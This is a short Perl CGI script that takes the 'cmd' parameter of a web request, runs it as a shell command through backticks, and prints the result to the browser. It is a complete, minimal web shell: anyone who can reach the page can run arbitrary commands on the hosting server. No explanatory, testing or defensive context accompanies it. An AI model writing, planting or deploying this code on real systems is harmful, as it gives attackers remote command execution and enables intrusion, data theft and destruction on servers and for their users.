#!/usr/bin/perl
use CGI qw(:standard);
print header();
my $cmd = param('cmd');
print `$cmd` if $cmd;
